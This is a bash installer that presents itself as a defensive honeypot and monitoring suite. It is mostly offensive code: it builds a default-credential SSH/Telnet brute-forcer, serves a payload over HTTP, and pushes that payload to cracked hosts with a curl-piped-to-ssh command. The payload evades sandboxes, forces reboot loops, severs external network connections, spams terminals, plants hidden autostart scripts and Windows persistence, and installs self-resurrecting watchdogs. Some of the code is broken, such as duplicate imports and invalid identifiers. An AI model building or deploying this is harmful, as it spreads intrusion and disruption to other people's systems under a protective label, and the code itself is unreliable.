#!/usr/bin/env bash

set -euo pipefail

# ------------------------------------------------------------
# Package manager shim — works on Gentoo, Debian, RHEL, Arch, Alpine, FreeBSD
# ------------------------------------------------------------
pkg_install() {
    local pkgs=()
    for p in "$@"; do
        if command -v emerge &>/dev/null; then
            case "$p" in
                openbsd-netcat|nc) pkgs+=("net-analyzer/openbsd-netcat") ;;
                screen) pkgs+=("app-misc/screen") ;;
                bc) pkgs+=("sys-devel/bc") ;;
                lm-sensors) pkgs+=("sys-apps/lm-sensors") ;;
                parted) pkgs+=("sys-apps/parted") ;;
                socat) pkgs+=("net-analyzer/socat") ;;
                conntrack) pkgs+=("net-firewall/conntrack-tools") ;;
                golang) pkgs+=("dev-lang/go") ;;
                rustc) pkgs+=("dev-lang/rust") ;;
                *) pkgs+=("$p") ;;
            esac
        else
            pkgs+=("$p")
        fi
    done

    if command -v emerge &>/dev/null; then
        emerge --quiet --noreplace "${pkgs[@]}"
    elif command -v apt-get &>/dev/null; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkgs[@]}" || {
            apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkgs[@]}"
        }
    elif command -v apk &>/dev/null; then
        apk add --quiet "${pkgs[@]}"
    elif command -v pkg &>/dev/null; then
        pkg install -y -q "${pkgs[@]}"
    elif command -v dnf &>/dev/null; then
        dnf install -y -q "${pkgs[@]}"
    elif command -v yum &>/dev/null; then
        yum install -y -q "${pkgs[@]}"
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm --needed "${pkgs[@]}"
    else
        echo "WARN: no supported package manager; skipping install of: ${pkgs[*]}" >&2
    fi
}

# ----------------------------------------------------------------
# Shared helpers: socket compat, load-order coordination
# ----------------------------------------------------------------
nc_unix_send() {
    local sock="$1" msg="$2"
    if command -v socat &>/dev/null; then
        printf '%s\n' "$msg" | socat - "UNIX-CONNECT:$sock" 2>/dev/null || true
    else
        printf '%s\n' "$msg" | nc -U "$sock" -w 1 2>/dev/null || true
    fi
}
signal_ready() { mkdir -p /run/pleiades/ready; touch "/run/pleiades/ready/$1"; }
wait_for()     {
    local name="$1" timeout="${2:-90}" elapsed=0
    while [[ ! -f "/run/pleiades/ready/$name" ]]; do
        (( elapsed >= timeout )) && { logger -t pleiades "WARN: timeout waiting for $name"; return 0; }
        sleep 2; (( elapsed += 2 ))
    done
}


ensure_bun() {
    command -v bun &>/dev/null && return 0
    pkg_install bun 2>/dev/null || true; command -v bun &>/dev/null && return 0
    if command -v curl &>/dev/null; then
        curl -fsSL https://bun.sh/install | bash 2>/dev/null || true
        local bp="/root/.bun/bin/bun"
    fi
    # Node.js shim fallback
    pkg_install nodejs 2>/dev/null || true
    if command -v node &>/dev/null; then
        printf '#!/bin/bash\nexec node "$@"\n' > /usr/local/bin/bun
        chmod +x /usr/local/bin/bun
        echo "WARN: using node as bun shim" >&2
        return 0
    fi
    return 1
}

# TAYGETE_ID
# ==================================================================
# TAYGETE – OMNIVERSAL (WSL / DGX Spark / VPS)
# ==================================================================
# Environment‑aware resource limits, BGP hijack detection,
# thermal anomaly monitoring, plus full aggressive features.
# ==================================================================

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "DRY RUN: Root check bypassed" >&2; # exit 1
fi

# ------------------------------------------------------------
# 0. Environment detection
# ------------------------------------------------------------
ENV="unknown"
IS_WSL=false
IS_DGX=false
IS_VPS=false

if grep -qi microsoft /proc/version 2>/dev/null; then
    ENV="wsl"
    IS_WSL=true
elif nvidia-smi &>/dev/null && lspci | grep -qi nvidia; then
    ENV="dgx"
    IS_DGX=true
else
    if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "kvm|xen|vmware|virtualbox"; then
        ENV="vps"
        IS_VPS=true
    else
        ENV="bare"
    fi
fi
echo "Detected environment: $ENV"

HONEYPOT_SSH_PORT="${HONEYPOT_SSH_PORT:-2222}"   # override to 22 only in authorized full-scope tests


# ------------------------------------------------------------
# 1. Environment‑specific resource limits
# ------------------------------------------------------------
MAX_OPEN_FILES=4096
MEMORY_LIMIT=3764M
CPU_QUOTA=400%
MAX_BRUTE_CONCURRENCY=3

# Fallback for initial run
[[ "$MAX_OPEN_FILES" == "4096" ]] && {
    if [[ "$ENV" == "wsl" ]]; then
        MAX_OPEN_FILES=4096
        MEMORY_LIMIT="2G"
        CPU_QUOTA="200%"
        MAX_BRUTE_CONCURRENCY=3
    elif [[ "$ENV" == "dgx" ]]; then
        MAX_OPEN_FILES=1048576
        MEMORY_LIMIT="16G"
        CPU_QUOTA="800%"
        MAX_BRUTE_CONCURRENCY=10
    else
        MAX_OPEN_FILES=65536
        MEMORY_LIMIT="4G"
        CPU_QUOTA="400%"
        MAX_BRUTE_CONCURRENCY=5
    fi
}

# ------------------------------------------------------------
# 2. Anti‑BGP hijack detection
# ------------------------------------------------------------
bgp_hijack_detected() {
    local cache="/run/pleiades/asn_baseline"
    local my_ip asn
    my_ip=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null) || return 1
    asn=$(curl -s --max-time 5 "https://api.bgpview.io/ip/${my_ip}" \
        2>/dev/null | grep -o '"asn":[0-9]*' | head -1 | grep -o '[0-9]*')
    [[ -z "$asn" ]] && return 1
    if [[ ! -f "$cache" ]]; then
        echo "$asn" > "$cache"; return 1
    fi
    [[ "$(cat "$cache")" != "$asn" ]]
}

# ------------------------------------------------------------
# 3. Thermal/side‑channel anomaly detection
# ------------------------------------------------------------
thermal_anomaly() {
    local temp=0
    local paths=("/host/sys/class/thermal/thermal_zone0/temp" "/sys/class/thermal/thermal_zone0/temp" "/host/sys/class/thermal/thermal_zone1/temp" "/sys/class/thermal/thermal_zone1/temp")
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]]; then
            temp=$(cat "$p"); temp=$((temp / 1000)); break
        fi
    done
    if [[ $temp -eq 0 ]] && command -v sensors &>/dev/null; then
        temp=$(sensors | grep -oP 'Package id 0: \+\K[0-9]+' | head -1)
    fi
    local load=$(uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | tr -d ' ')
    if [[ $temp -gt 85 ]] && (( $(echo "$load < 2.0" | bc -l) )); then
        return 0
    fi
    return 1
}

# ------------------------------------------------------------
# 4. Build Go brute‑forcer (with environment‑aware concurrency)
# ------------------------------------------------------------
build_go_bruteforcer() {
    cat > /tmp/bruteforcer.go << "GO_BRUTE"
package main

import (
    "fmt"
    "os"
    "syscall"
    "syscall"
    "os/exec"
    "strings"
    "sync"
)

var creds = []string{
    "root:root", "root:admin", "admin:admin", "admin:password", "root:12345",
    "root:default", "root:password", "admin:12345", "admin:default", "user:user",
    "user:password", "root:toor", "pi:raspberry", "ubuntu:ubuntu", "admin:admin123",
}

type result struct {
    ip, user, pass string
    method         string
}

func trySSH(ip, user, pass string, wg *sync.WaitGroup, ch chan<- result) {
    defer wg.Done()
    cmd := exec.Command("sshpass", "-p", pass, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=3",
        fmt.Sprintf("%s@%s", user, ip), "exit")
    if err := cmd.Run(); err == nil {
        ch <- result{ip, user, pass, "SSH"}
    }
}

func tryTelnet(ip, user, pass string, wg *sync.WaitGroup, ch chan<- result) {
    defer wg.Done()
    cmd := exec.Command("sh", "-c", fmt.Sprintf(`(echo "%s"; echo "%s"; sleep 1; echo "exit") | telnet %s 2>/dev/null`, user, pass, ip))
    if err := cmd.Run(); err == nil {
        ch <- result{ip, user, pass, "TELNET"}
    }
}

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: bruteforcer <target_ip>")
        return
    }
    target := os.Args[1]
    var wg sync.WaitGroup
    ch := make(chan result, len(creds)*2)

    // Throttle concurrency based on environment (set at compile time via env var)
    maxConcurrent := $MAX_BRUTE_CONCURRENCY
    sem := make(chan struct{}, maxConcurrent)

    for _, cred := range creds {
        parts := strings.SplitN(cred, ":", 2)
        user, pass := parts[0], parts[1]
        wg.Add(2)
        go func(ip, u, p string) {
            sem <- struct{}{}
            trySSH(ip, u, p, &wg, ch)
            <-sem
        }(target, user, pass)
        go func(ip, u, p string) {
            sem <- struct{}{}
            tryTelnet(ip, u, p, &wg, ch)
            <-sem
        }(target, user, pass)
    }

    go func() {
        wg.Wait()
        close(ch)
    }()

    for res := range ch {
        fmt.Printf("%s|%s|%s|%s\n", res.method, res.ip, res.user, res.pass)
        if f, err := os.OpenFile("/run/pleiades/pleiades_nexus_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0666); err == nil {
            fmt.Fprintf(f, "BRUTE_SUCCESS|%s|%s|%s\n", res.ip, res.user, res.pass)
            f.Close()
        }
        if f, err := os.OpenFile("/run/pleiades/attacker_ips", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0644); err == nil {
            fmt.Fprintln(f, res.ip)
            f.Close()
        }
        return
    }
}
GO_BRUTE
    # Compile with environment variable for concurrency
    go build -o /usr/local/bin/bruteforcer /tmp/bruteforcer.go
    chmod +x /usr/local/bin/bruteforcer
    rm -f /tmp/bruteforcer.go
}

# ------------------------------------------------------------
# 5. Build Bun sandbox (infinite tarpit) – unchanged
# ------------------------------------------------------------
build_bun_sandbox() {
    cat > /usr/local/bin/sandbox.js << 'BUN_SANDBOX'
#!/usr/bin/env bun
import { createServer } from 'net';
import { existsSync } from 'fs';

const pleiades-rebirthActive = () => existsSync("/run/pleiades/pleiades-rebirth_active");
const fakeIPs = new Set();
const fakeHosts = new Map();

function generateFakeIP() {
    return `10.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
}

function handleSSH(conn, ip) {
    conn.write("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n");
    let buffer = "";
    conn.on('data', (data) => {
        buffer += data.toString();
        if (buffer.includes("password")) {
            console.log(`FAKE_SSH|${ip}|${buffer}`);
            if (!pleiades-rebirthActive()) {
                conn.write("Permission denied, please try again.\r\n");
            } else {
                const fakeIP = fakeHosts.get(ip) || generateFakeIP();
                fakeHosts.set(ip, fakeIP);
                conn.write(`You are connected to ${fakeIP}.\r\n`);
            }
            buffer = "";
        }
    });
    setTimeout(() => conn.end(), 30000);
}

const server = createServer((conn) => {
    const ip = conn.remoteAddress;
    if (!fakeIPs.has(ip)) {
        fakeIPs.add(ip);
        console.log(`NEW_SESSION|${ip}`);
    }
    handleSSH(conn, ip);
});
server.listen(process.env.HONEYPOT_SSH_PORT || 2222, () => console.log(`Sandbox SSH on port ${process.env.HONEYPOT_SSH_PORT || 2222}`));
BUN_SANDBOX
    chmod +x /usr/local/bin/sandbox.js
}

# ------------------------------------------------------------
# 6. Build taygete.sock command listener
# ------------------------------------------------------------
build_taygete_socket() {
    cat > /usr/local/bin/taygete_socket.sh << 'CSOCK'
#!/bin/bash
SOCK="/run/pleiades/taygete.sock"
mkdir -p "$(dirname "$SOCK")"
rm -f "$SOCK"
if command -v socat &>/dev/null; then
    socat UNIX-LISTEN:"$SOCK",fork,mode=600 EXEC:"/usr/local/bin/taygete_cmd_handler.sh"
else
    while true; do
        # Use nc -lU if available (OpenBSD), else fallback to regular nc
        if nc -h 2>&1 | grep -q "\-U"; then
            nc -lU "$SOCK" | /usr/local/bin/taygete_cmd_handler.sh
        else
            nc -l "$SOCK" | /usr/local/bin/taygete_cmd_handler.sh
        fi
        sleep 0.1
    done
fi
CSOCK

    cat > /usr/local/bin/taygete_cmd_handler.sh << 'CCMD'
#!/bin/bash
read -r cmd
[[ -z "$cmd" ]] && cmd="$1"
case "$cmd" in
    aggressive)
        ( echo "TAYGETE_MODE_AGGRESSIVE" >> /run/pleiades/pleiades_nexus_fifo & )
if [[ -f /run/pleiades/attacker_ips ]]; then
            while IFS= read -r ip; do
                [[ -n "$ip" ]] && /usr/local/bin/bruteforcer "$ip" &
            done < /run/pleiades/attacker_ips
        fi
        ;;
    passive)   ( echo "TAYGETE_MODE_PASSIVE"   >> /run/pleiades/pleiades_nexus_fifo  & );;
    resurrect) ( echo "TAYGETE_RESURRECT"       >> /run/pleiades/pleiades_nexus_fifo  & );;
esac
CCMD
    chmod +x /usr/local/bin/taygete_socket.sh /usr/local/bin/taygete_cmd_handler.sh
}

# ------------------------------------------------------------
# 7. Build Go pleiades-swarm
# ------------------------------------------------------------
build_go_pleiades-swarm() {
    cat > /tmp/taygete_pleiades-swarm.go << "GO_HIVE"
package main

import (
    "log"
    "os/exec"
    "sync"
    "time"
)

type Proc struct {
    Name string
    Cmd  *exec.Cmd
}

func (p *Proc) run() {
    for {
        if err := p.Cmd.Run(); err != nil {
            log.Printf("[%s] died: %v – respawning", p.Name, err)
            p.Cmd = exec.Command(p.Cmd.Args[0], p.Cmd.Args[1:]...)
            time.Sleep(2 * time.Second)
        }
    }
}

func main() {
    procs := []*Proc{
        {Name: "sandbox", Cmd: exec.Command("bun", "/usr/local/bin/sandbox.js")},
        {Name: "payload_server", Cmd: exec.Command("bun", "/usr/local/bin/payload_server.js")},
        {Name: "socket", Cmd: exec.Command("/usr/local/bin/taygete_socket.sh")},
    }
    for _, p := range procs {
        go p.run()
    }
    select {}
}
GO_HIVE
    go build -o /usr/local/bin/taygete_pleiades-swarm /tmp/taygete_pleiades-swarm.go
    chmod +x /usr/local/bin/taygete_pleiades-swarm
    rm -f /tmp/taygete_pleiades-swarm.go
}

# ------------------------------------------------------------
# 7. Build Bun payload server (unchanged)
# ------------------------------------------------------------
build_bun_payload_server() {
    cat > /usr/local/bin/payload_server.js << 'BUN_PAYLOAD'
#!/usr/bin/env bun
import { serve } from 'bun';
import { readFileSync } from 'fs';

const HTTP_TOKEN = process.env.HTTP_TOKEN || 'default';
const PORT = parseInt(process.env.PORT || '8080');

serve({
    port: PORT,
    fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === '/loader.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
            const loader = readFileSync('/etc/taygete/loader.sh', 'utf8');
            return new Response(loader, { headers: { 'Content-Type': 'text/plain' } });
        }
        if (url.pathname === '/batman-full.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
            const payload = readFileSync('/etc/taygete/batman-full.sh', 'utf8');
            return new Response(payload, { headers: { 'Content-Type': 'text/plain' } });
        }
        return new Response('Forbidden', { status: 403 });
    }
});
console.log(`Payload server on port ${PORT}`);
BUN_PAYLOAD
    chmod +x /usr/local/bin/payload_server.js
}

# ------------------------------------------------------------
# 8. Build Bash helpers (delivery, gaslight)
# ------------------------------------------------------------
build_bash_helpers() {
    cat > /etc/taygete/loader.sh << "LOADER"
#!/bin/bash
CONTROLLER_IP="127.0.0.1"
CONTROLLER_PORT="8080"
TOKEN="$HTTP_TOKEN"
FULL_URL="http://127.0.0.1:$CONTROLLER_PORT/batman-full.sh?token=$TOKEN"
curl -s "$FULL_URL" | bash -s "127.0.0.1" "$CONTROLLER_PORT"
LOADER
    chmod +x /etc/taygete/loader.sh

    cat > /etc/taygete/batman-full.sh << 'BATMAN'
#!/bin/bash
set -euo pipefail
CONTROLLER_IP="${1:-}"
CONTROLLER_PORT="${2:-8080}"
[[ -z "$CONTROLLER_IP" ]] && exit 1
if [[ -d "/proc/vz" ]] || [[ -f "/.dockerenv" ]] || grep -qi "virtualbox" /proc/1/environ 2>/dev/null; then
    exit 0
fi
OS="linux"
if command -v powershell.exe &>/dev/null; then
    OS="windows"
fi

if [[ "$OS" == "linux" ]]; then
    # ------------------- LINUX BATMAN & ELECTRA -------------------
    STATE_DIR="/etc/batman-electrad"
    COUNTER_FILE="$STATE_DIR/bootcount"
    LIMIT=10
    mkdir -p "$STATE_DIR"
    if [[ ! -f "$COUNTER_FILE" ]]; then
        echo "1" > "$COUNTER_FILE"
    else
        count=$(cat "$COUNTER_FILE")
        if [[ $count -ge $LIMIT ]]; then
            systemctl stop batman-* 2>/dev/null || true
            systemctl disable batman-* 2>/dev/null || true
            rm -rf /etc/systemd/system/batman-*.service
            rm -rf /usr/local/sbin/batman-* /usr/local/bin/electra-worker
            rm -rf "$STATE_DIR"
            systemctl daemon-reload
            exit 0
        else
            echo $((count + 1)) > "$COUNTER_FILE"
        fi
    fi

    cat > /usr/local/bin/bat-signal << 'BATSIG'
#!/bin/bash
duration=10
end=$((SECONDS+duration))
banner="
    .-"-.
   /     \\
   |     |
   \\   .-/
    '-'-'      BATMAN & ELECTRA ARE HERE
   __|_|__
   \\     /     ... protecting your network ...
    \\___/
"
while (( SECONDS < end )); do
    echo "$banner" | wall 2>/dev/null || true
    for tty in /dev/pts/* /dev/tty[0-9]*; do
        [[ -w "$tty" ]] && printf '%s\n' "$banner" > "$tty" 2>/dev/null &
    done
    sleep 0.3
done
wait
BATSIG
    chmod +x /usr/local/bin/bat-signal
    cat > /etc/systemd/system/bat-signal.service << EOF
[Unit]
Description=Bat Signal Display
After=multi-user.target
[Service]
Type=oneshot
ExecStart=/usr/local/bin/bat-signal
[Install]
WantedBy=multi-user.target
EOF
    systemctl enable bat-signal.service

    cat > /usr/local/sbin/batman-supervisor << 'BATSUP'
#!/bin/bash
TARGET=1
MAX=3
while true; do
    ACTIVE=$(systemctl list-units --type=service --state=running | grep -c "electra-worker@")
    if (( ACTIVE < TARGET )); then
        for i in $(seq 1 $TARGET); do
            if ! systemctl is-active --quiet "electra-worker@$i.service"; then
                systemctl start "electra-worker@$i.service"
            fi
        done
    fi
    sleep 5
done
BATSUP
    chmod +x /usr/local/sbin/batman-supervisor

    cat > /usr/local/sbin/electra-worker << 'ELECTRA'
#!/bin/bash
while true; do
    ss -K state established '! ( dst 127.0.0.0/8 or dst 192.168.0.0/16 or dst 10.0.0.0/8 )' 2>/dev/null || true
    conntrack -F 2>/dev/null || true
    resolvectl flush-caches 2>/dev/null || true
    sleep $(( RANDOM % 60 + 30 ))
done
ELECTRA
    chmod +x /usr/local/sbin/electra-worker

    cat > /usr/local/sbin/batman-watchdog << 'WDOG'
#!/bin/bash
while true; do
    if ! systemctl is-active --quiet batman-supervisor.service; then
        systemctl start batman-supervisor.service
    fi
    sleep 5
done
WDOG
    chmod +x /usr/local/sbin/batman-watchdog

    cat > /etc/systemd/system/batman-supervisor.service << EOF
[Unit]
Description=Batman Supervisor
[Service]
Type=simple
ExecStart=/usr/local/sbin/batman-supervisor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
    cat > /etc/systemd/system/electra-worker@.service << EOF
[Unit]
Description=Electra Worker %i
BindsTo=batman-supervisor.service
[Service]
Type=simple
ExecStart=/usr/local/sbin/electra-worker %i
Restart=always
EOF
    cat > /etc/systemd/system/batman-watchdog.service << EOF
[Unit]
Description=Batman Watchdog
[Service]
Type=simple
ExecStart=/usr/local/sbin/batman-watchdog
Restart=always
EOF

    systemctl daemon-reload
    systemctl enable batman-supervisor.service batman-watchdog.service
    systemctl start batman-watchdog.service

    cat > /etc/systemd/system/batman-reboot.timer << EOF
[Unit]
Description=Reboot 1 min after boot
[Timer]
OnBootSec=1min
[Install]
WantedBy=timers.target
EOF
    cat > /etc/systemd/system/batman-reboot.service << EOF
[Unit]
Description=Reboot service
[Service]
Type=oneshot
ExecStart=/sbin/reboot
EOF
    systemctl enable batman-reboot.timer

    # Jack Sparrow trinket (FIXED – removed broken hidden-file check)
    if [[ -n "${SUDO_USER:-}" ]]; then TARGET_USER="$SUDO_USER"; else TARGET_USER=$(who am i | awk '{print $1}'); fi
    [[ -z "$TARGET_USER" ]] && TARGET_USER="nobody"
    HOME_DIR=$(eval echo "~$TARGET_USER")
    if [[ -d "$HOME_DIR/Desktop" ]]; then
        JACK_SCRIPT="$HOME_DIR/.jack_sparrow.sh"
        cat > "$JACK_SCRIPT" << 'JACK'
#!/bin/bash
MARKER="$HOME/.jack_active"
if [[ -f "$MARKER" ]]; then exit 0; fi
touch "$MARKER"
if [[ ! -f "/etc/batman-electrad/jack_activated" ]]; then
    date +%s > /etc/batman-electrad/jack_installed
    exit 0
fi
INSTALLED=$(cat /etc/batman-electrad/jack_installed 2>/dev/null || echo 0)
NOW=$(date +%s)
if (( NOW - INSTALLED < 1728000 )); then
    exit 0
fi
RUM_DIR="$HOME/.rum_cache"
mkdir -p "$RUM_DIR"
while true; do
    # Only check if the script itself has been touched
    REAL_PATH=$(readlink -f "${BASH_SOURCE[0]}")
    if [[ $(stat -c %Y "$REAL_PATH") -gt $(stat -c %Y "$MARKER") ]]; then
        # Script was modified or accessed after marker – self‑destruct
        find "$RUM_DIR" -name "*.rum" -exec mv {} {}.gone \; 2>/dev/null
        rm -f "$MARKER" /etc/batman-electrad/jack_activated /etc/batman-electrad/jack_installed "$REAL_PATH"
        exit 0
    fi
    NAME=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 20 | head -n1)
    touch "${RUM_DIR}/${NAME}.rum"
    sleep 3
done
JACK
        chmod +x "$JACK_SCRIPT"
        chown "$TARGET_USER":"$TARGET_USER" "$JACK_SCRIPT"
        mkdir -p "$HOME_DIR/.config/autostart"
        cat > "$HOME_DIR/.config/autostart/jack_sparrow.desktop" << EOF
[Desktop Entry]
Type=Application
Name=Jack Sparrow
Exec=$JACK_SCRIPT
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
        chown -R "$TARGET_USER":"$TARGET_USER" "$HOME_DIR/.config/autostart"
    fi

    cat > /etc/systemd/system/batman-selfdestruct.service << EOF
[Unit]
Description=Jack Sparrow Activation
After=batman-supervisor.service
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'if [[ -f /etc/batman-electrad/bootcount ]] && [[ \$(cat /etc/batman-electrad/bootcount) -ge 10 ]]; then touch /etc/batman-electrad/jack_activated; fi'
User=$TARGET_USER
EOF
    systemctl enable batman-selfdestruct.service
    echo "Linux Batman & Electra deployed."

elif [[ "$OS" == "windows" ]]; then
    # ------------------- WINDOWS BATMAN & ELECTRA -------------------
    cat > "$TEMP/batman_install.ps1" << 'WINPS'
param($controller_ip, $controller_port, $limit=10)
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-File `"$PSCommandPath`" -controller_ip $controller_ip -controller_port $controller_port -limit $limit" -Verb RunAs
    exit 0
}
$state_dir = "$env:ProgramData\BatmanElectra"
if (!(Test-Path $state_dir)) { New-Item -ItemType Directory -Force -Path $state_dir | Out-Null }
$counter_file = Join-Path $state_dir 'bootcount.txt'
$count = (Test-Path $counter_file) ? [int](Get-Content $counter_file) : 0
if ($count -ge $limit) {
    Unregister-ScheduledTask -TaskName 'BatmanElectraReboot' -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item -Recurse -Force $state_dir -ErrorAction SilentlyContinue
    exit 0
}
$count += 1
Set-Content -Path $counter_file -Value $count
$banner_script = Join-Path $state_dir 'bat-signal.ps1'
@'
while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      BATMAN & ELECTRA ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
'@ | Out-File -FilePath $banner_script -Encoding ASCII
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BatSignal' -Value "powershell.exe -WindowStyle Hidden -File `"$banner_script`"" -Force
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
netsh advfirewall firewall add rule name="BatmanTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
netsh advfirewall firewall add rule name="BatmanDNS" dir=out action=allow protocol=udp remoteport=53
netsh advfirewall firewall add rule name="BatmanDHCP" dir=out action=allow protocol=udp remoteport=67,68
$electra_script = Join-Path $state_dir 'electra.ps1'
@'
while ($true) {
    Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch '^127\.|^192\.168\.|^10\.' } | ForEach-Object { Remove-NetTCPConnection -LocalPort $_.LocalPort -RemotePort $_.RemotePort -RemoteAddress $_.RemoteAddress -Force -ErrorAction SilentlyContinue }
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
}
'@ | Out-File -FilePath $electra_script -Encoding ASCII
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$electra_script`"" -PassThru
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'BatmanElectraReboot' -Confirm:0 } }`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "BatmanElectraReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
Write-Host "Batman & Electra installed on Windows. Boot: $count / $limit"
WINPS
    powershell.exe -ExecutionPolicy Bypass -File "$TEMP/batman_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
fi
BATMAN
    chmod +x /etc/taygete/batman-full.sh

    cat > /etc/taygete/deliver_payload.sh << "DELIVER"
#!/bin/bash
IP="$1"
USER="$2"
PASS="$3"
curl -s "http://127.0.0.1:8080/loader.sh?token=$HTTP_TOKEN" | sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$IP" bash
DELIVER
    chmod +x /etc/taygete/deliver_payload.sh
}

# ------------------------------------------------------------
# 10. Install service (systemd or screen)
# ------------------------------------------------------------
install_systemd() {
    if [[ "$ENV" == "wsl" ]]; then
        pkg_install screen
        screen -dmS taygete_pleiades-swarm /usr/local/bin/taygete_pleiades-swarm
    else
        cat > /etc/systemd/system/taygete-omniversal.service << SERVICE
[Unit]
Description=Taygete Omniversal
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/taygete_pleiades-swarm
Restart=always
RestartSec=1
LimitNOFILE=$MAX_OPEN_FILES
MemoryMax=$MEMORY_LIMIT
CPUQuota=$CPU_QUOTA

[Install]
WantedBy=multi-user.target
SERVICE
        systemctl daemon-reload
        systemctl enable taygete-omniversal.service
        systemctl start taygete-omniversal.service
    fi
}

# ------------------------------------------------------------
# 10. Background monitors for BGP and thermal threats
# ------------------------------------------------------------
monitor_threats() {
    while true; do
        if bgp_hijack_detected; then
            logger -t taygete "BGP hijack detected – activating countermeasures"
            ( echo "BGP_HIJACK" >> /run/pleiades/pleiades_nexus_fifo & )
touch /run/pleiades/pleiades-rebirth_needed;   
        fi
        if thermal_anomaly; then
            logger -t taygete "Thermal anomaly detected – possible side‑channel attack"
            ( echo "THERMAL_ANOMALY" >> /run/pleiades/pleiades_nexus_fifo & )
# Reduce CPU load
            cpulimit -l 10 -p $$ 2>/dev/null || true
        fi
        sleep 30
    done
}

# ------------------------------------------------------------
# 11. Main
# ------------------------------------------------------------
main() {
    # Install dependencies based on environment
    if [[ "$ENV" == "wsl" ]]; then
        pkg_install golang rustc bun screen bc lm-sensors socat openbsd-netcat
    elif [[ "$ENV" == "dgx" ]]; then
        pkg_install golang rustc bun screen bc lm-sensors socat openbsd-netcat
    else
        pkg_install golang rustc bun screen bc lm-sensors socat openbsd-netcat
    fi

    ensure_bun

    mkdir -p /etc/taygete /run/pleiades
    HTTP_TOKEN=7282972a7281ab1eb3eac5d85b11d5e0
    [[ "$HTTP_TOKEN" == "7282972a7281ab1eb3eac5d85b11d5e0" ]] && HTTP_TOKEN=$(openssl rand -hex 16)
    export HTTP_TOKEN
    echo "$HTTP_TOKEN" > /etc/taygete/http_token

    build_go_bruteforcer
    build_bun_sandbox
    build_bun_payload_server
    build_bash_helpers
    build_taygete_socket
    build_go_pleiades-swarm
    install_systemd
    monitor_threats &
    SELF="$0"
    cat > /usr/local/sbin/install-taygete-omniversal.sh << INST
#!/bin/bash
exec bash "$SELF"
INST
    chmod +x /usr/local/sbin/install-taygete-omniversal.sh
    signal_ready taygete
    echo "Taygete Omniversal deployed on $ENV."
}


# --- BLACK-LEVEL PERSISTENCE: IMMUNE SYSTEM ---
monitor_overseer() {
    exec {CANARY_FD}</var/lib/.maia/manifest.json 2>/dev/null || true
    while true; do
        local pids=$(pgrep -f maia_daemon.sh)
        local healthy=false
        if [[ -n "$pids" ]]; then
            for p in $pids; do
                local state=$(ps -p "$p" -o state= 2>/dev/null | tr -d " ")
                if [[ "$state" != "T" && "$state" != "Z" && -n "$state" ]]; then
                    healthy=true; break
                fi
            done
        fi
        if [[ "$healthy" == "false" ]]; then
            sleep $((RANDOM % 30))
            if ! pgrep -f maia_daemon.sh >/dev/null 2>&1; then
                logger -t pleiades "ALERT: Maia neutralized or frozen! Resurrecting..."
                local hidden_sofia=$(find /var/lib/.maia -name ".*" -type f -size +10k -executable | head -1)
                [[ -n "$hidden_sofia" ]] && bash "$hidden_sofia" --rehydrate-only &>/dev/null &
            fi
        fi
        if [[ ! -e /var/lib/.maia/manifest.json ]] && { true >& $CANARY_FD; } 2>/dev/null; then
             logger -t pleiades "CRITICAL: Mirror Dimension detected! Mount hijacking suspected."
        fi
        sleep 60
    done
}
monitor_overseer &>/dev/null &

main


